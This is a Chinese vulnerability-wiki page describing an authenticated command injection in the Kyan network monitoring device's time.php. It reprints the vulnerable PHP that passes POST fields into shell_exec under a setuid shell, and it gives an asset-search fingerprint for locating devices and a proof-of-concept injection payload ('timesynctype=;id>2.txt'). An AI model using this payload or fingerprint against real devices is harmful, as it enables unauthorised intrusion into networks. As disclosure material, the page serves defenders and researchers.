<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Kyan%20%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87%20time.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Kyan 网络监控设备 time.php 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Kyan \u7f51\u7edc\u76d1\u63a7\u8bbe\u5907 time.php \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../MSA%20%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3%20msa%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../MSA%20%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3%20msa%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        MSA 互联网管理网关 msa 任意文件下载漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Kyan%20%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87%20run.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Kyan%20%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87%20run.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Kyan 网络监控设备 run.php 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="kyan-timephp">Kyan 网络监控设备 time.php 远程命令执行漏洞<a class="headerlink" href="#kyan-timephp" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Kyan 网络监控设备 time.php 可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程命令执行漏洞</p>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>Kyan
</code></pre></div>
<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>app=&quot;Kyan设计&quot;
</code></pre></div>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>登录页面如下</p>
<p><img alt="image-20220519175106605" src="../images/202205191753857.png" /></p>
<p>存在漏洞的文件: <code>/time.php</code></p>
<div class="highlight"><pre><span></span><code>&lt;?php
require_once &#39;functions.php&#39;;
require_once &#39;international.php&#39;;

session_start();
auth_check();

//showHeader(&#39;Route&#39;, array(&#39;table.css&#39;));
if($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;)
{
    if(!user_is_admin())
    {
        showErrMessage(&quot;permission denied&quot;);
        exit;
    }
    $timesynctype = $_POST[&quot;timesynctype&quot;];
    if($timesynctype!=&quot;client&quot;)
    {
        $output = shell_exec(&quot;/bin/bashsuid -p -c \&quot;/usr/sbin/ntpdate &quot; .$timesynctype. &quot;\&quot;&quot;);
        showMessage($output);       
        shell_exec(&quot;/bin/bashsuid -p -c \&quot;hwclock --systohc\&quot;&quot;);
    }else
    {
        $ctime = $_POST[&quot;ctime&quot;];
        shell_exec(&quot;/bin/bashsuid -p -c \&quot;date &quot; .$ctime. &quot;\&quot;&quot;);
        shell_exec(&quot;/bin/bashsuid -p -c \&quot;hwclock --systohc\&quot;&quot;);
    }
}
        echo &quot;&lt;html xmlns=\&quot;http://www.w3.org/1999/xhtml\&quot;&gt;\n&quot;;
        echo &quot;  &lt;head&gt;\n&quot;;
        echo &quot;    &lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=UTF-8\&quot; /&gt;\n&quot;;
        echo &quot;    &lt;meta http-equiv=\&quot;Content-Style-Type\&quot; content=\&quot;text/css\&quot; /&gt;\n&quot;;
        echo &quot;    &lt;meta http-equiv=\&quot;Content-Script-Type\&quot; content=\&quot;text/javascript\&quot; /&gt;\n&quot;;
        echo &quot;    &lt;link type=\&quot;text/css\&quot; rel=\&quot;stylesheet\&quot; href=\&quot;./templates/clean.css\&quot; title=\&quot;PSI_Template\&quot;/&gt;\n&quot;;
        echo &quot;    &lt;title&gt;time&lt;/title&gt;\n&quot;;
    echo &quot;&lt;style type=\&quot;text/css\&quot;&gt;&quot;;
    echo &quot;th, td, h3 {&quot;;
    echo &quot;font-size: 12px;&quot;;
    echo &quot;}&quot;;
    echo &quot;&lt;/style&gt;&quot;;
        echo &quot;  &lt;/head&gt;\n&quot;; 

//print_html_begin(&quot;time&quot;);
?&gt;
&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
//因程序执行耗费时间,所以时间并不十分准确,误差大约在2000毫秒以下
var xmlHttp = false;
//获取服务器时间
try {
  xmlHttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
} catch (e) {
  try {
    xmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
  } catch (e2) {
    xmlHttp = false;
  }
}

if (!xmlHttp &amp;&amp; typeof XMLHttpRequest != &#39;undefined&#39;) {
  xmlHttp = new XMLHttpRequest();
}

xmlHttp.open(&quot;GET&quot;, &quot;null.txt&quot;, false);
xmlHttp.setRequestHeader(&quot;Range&quot;, &quot;bytes=-1&quot;);
xmlHttp.send(null);

severtime=new Date(xmlHttp.getResponseHeader(&quot;Date&quot;));

//获取服务器日期
var year=severtime.getFullYear();
var month=severtime.getMonth()+1;
var date=severtime.getDate();
//获取服务器时间
var hour=severtime.getHours();
var minu=severtime.getMinutes();
var seco=severtime.getSeconds();
//获取客户端时间
localtime=new Date();
//取得时间差
var jtime=Math.abs(localtime.getTime()-severtime.getTime());
var jdate=jtime/(24*60*60*1000);
var jhour=jtime%(24*60*60*1000)/(60*60*1000);
var jminu=jtime%(24*60*60*1000)%(60*60*1000)/(60*1000);
var jsecond=jtime%(24*60*60*1000)%(60*60*1000)%(60*1000)/1000;

//格式化输出客户端时间
function getClientTime(){
localtime=new Date();
var cyear=localtime.getFullYear();
var cmonth=localtime.getMonth()+1;
var cdate=localtime.getDate();
var chour=localtime.getHours();
var cminu=localtime.getMinutes();
var cseco=localtime.getSeconds();

ccyear=addZero(cyear);
ccmonth=addZero(cmonth);
ccdate=addZero(cdate);
cchour=addZero(chour);
ccminu=addZero(cminu);
ccseco=addZero(cseco);

 document.getElementById(&quot;clienttime&quot;).innerHTML=ccyear+&quot;-&quot;+ccmonth+&quot;-&quot;+ccdate+&quot; &quot;+cchour+&quot;:&quot;+ccminu+&quot;:&quot;+ccseco;
 document.getElementById(&quot;ctime&quot;).value= ccmonth+&quot;&quot;+ccdate+&quot;&quot;+cchour+&quot;&quot;+ccminu+&quot;&quot;+ccyear+&quot;.&quot;+ccseco;
}
//格式化输出服务器时间
function getSeverTime(){
  seco++;
 if(seco==60){
  minu+=1;
  seco=0;
  }
 if(minu==60){
   hour+=1;
   minu=0;
 }
 if(hour==24){ 
  date+=1;
  hour=0;
 }
//日期处理
if(month==1||month==3||month==5||month==7
||month==8||month==10||month==12)
 {
  if(date==32)
  {
   date=1;
   month+=1;
   }
 }else if(month==4||month==6||month==9||month==11){
  if(date==31){
   date=1;
   month+=1;
   }
 }else if(month==2){
   if(year%4==0&amp;&amp;year%100!=0){//闰年处理
    if(date==29){
     date=1;
     month+=1;
    }
   }else{
    if(date==28){
     date=1;
     month+=1;
    }
   }
 }
 if(month==13){
 year+=1;
 month=1;
 }
 sseco=addZero(seco);
 sminu=addZero(minu);
 shour=addZero(hour);
 sdate=addZero(date);
 smonth=addZero(month);
 syear=year;

 document.getElementById(&quot;servertime&quot;).innerHTML=syear+&quot;-&quot;+smonth+&quot;-&quot;+sdate+&quot; &quot;+shour+&quot;:&quot;+sminu+&quot;:&quot;+sseco;
 setTimeout(&quot;getSeverTime()&quot;,1000);
 setTimeout(&quot;getClientTime()&quot;,100);
}

function addZero(num) {
num=Math.floor(num);
return ((num &lt;= 9) ? (&quot;0&quot; + num) : num);
}
function updatetime()
{
    return true;
}
&lt;/script&gt;

&lt;body onLoad=&quot;getSeverTime();&quot;&gt;
&lt;table style=&#39;width:500px&#39; border=&#39;0&#39; align=&#39;center&#39; cellpadding=&#39;3&#39; cellspacing=&#39;1&#39;&gt;
&lt;th colspan=&quot;2&quot;&gt;&lt;?php echo lang_get(&#39;Timer&#39;); ?&gt;&lt;/th&gt;
&lt;tr &gt;&lt;td align=&#39;right&#39; width=50%&gt;&lt;?php echo lang_get(&#39;System time&#39;)?&gt;&lt;/td&gt;&lt;td align=&#39;left&#39;&gt;&lt;div id=&quot;servertime&quot;&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr &gt;&lt;td align=&#39;right&#39;&gt;&lt;?php echo lang_get(&#39;Client time&#39;)?&gt;&lt;/td&gt;&lt;td align=&#39;left&#39;&gt;&lt;div id=&quot;clienttime&quot;&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr &gt;&lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;
&lt;form name=&quot;Form1&quot; method=&quot;post&quot; action=&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]?&gt;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;cdate&quot; id=&quot;cdate&quot; value=&quot;&quot;/&gt;
&lt;input type=&quot;hidden&quot; name=&quot;ctime&quot; id=&quot;ctime&quot; value=&quot;&quot;/&gt;
&lt;?php echo lang_get(&#39;Sync Source&#39;);?&gt;:
&lt;select name=&quot;timesynctype&quot; id=&quot;timesynctype&quot; &gt;
&lt;option value=&quot;time.windows.com&quot; selected=&quot;selected&quot;&gt;time.windows.com&lt;/option&gt;
&lt;option value=&quot;time.nist.gov&quot;&gt;time.nist.gov&lt;/option&gt;
&lt;?php 
/*$system_lic_file = &#39;/mnt/licenses/system/system.dat&#39;;
$bsynctoclient=false;
if(file_exists($system_lic_file))
{
    $output = shell_exec(&quot;/bin/bashsuid -p -c \&quot;openssl bf-cbc -K 000102030405060708090A0B0C0D0E0F -iv 0102030405060708 -d -in /mnt/licenses/system/system.dat |grep -v \&quot;^;\&quot;|grep Expire\&quot;&quot;);
    if($output == &quot;&quot;)
    {
        $bsynctoclient = true;
    }else
    {
        $bsynctoclient = false;
    }

}
if($bsynctoclient)
{*/
    echo &quot;&lt;option value=\&quot;client\&quot; &gt;&quot;.lang_get(&#39;PC Client&#39;).&quot;&lt;/option&gt;&quot;;
/* } */

?&gt;

&lt;/select&gt;
&lt;input  type=&quot;submit&quot; name=&quot;update&quot; id=&quot;update&quot; value=&quot;&lt;?php echo lang_get(&#39;Update Now&#39;);?&gt;&quot; /&gt;
&lt;/form&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php
//print_html_end();
?&gt;
</code></pre></div>
<p>其中需要注意的地方</p>
<div class="highlight"><pre><span></span><code>if($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;)
{
    if(!user_is_admin())
    {
        showErrMessage(&quot;permission denied&quot;);
        exit;
    }
    $timesynctype = $_POST[&quot;timesynctype&quot;];
    if($timesynctype!=&quot;client&quot;)
    {
        $output = shell_exec(&quot;/bin/bashsuid -p -c \&quot;/usr/sbin/ntpdate &quot; .$timesynctype. &quot;\&quot;&quot;);
        showMessage($output);       
        shell_exec(&quot;/bin/bashsuid -p -c \&quot;hwclock --systohc\&quot;&quot;);
    }else
    {
        $ctime = $_POST[&quot;ctime&quot;];
        shell_exec(&quot;/bin/bashsuid -p -c \&quot;date &quot; .$ctime. &quot;\&quot;&quot;);
        shell_exec(&quot;/bin/bashsuid -p -c \&quot;hwclock --systohc\&quot;&quot;);
    }
}
</code></pre></div>
<p>参数均可控，构造POC</p>
<div class="highlight"><pre><span></span><code>POST /time.php

timesynctype=;id&gt;2.txt
</code></pre></div>
<p><img alt="image-20220519175346874" src="../images/202205191753984.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../MSA%20%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3%20msa%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../MSA%20%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3%20msa%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        MSA 互联网管理网关 msa 任意文件下载漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Kyan%20%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87%20run.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Kyan%20%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87%20run.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Kyan 网络监控设备 run.php 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>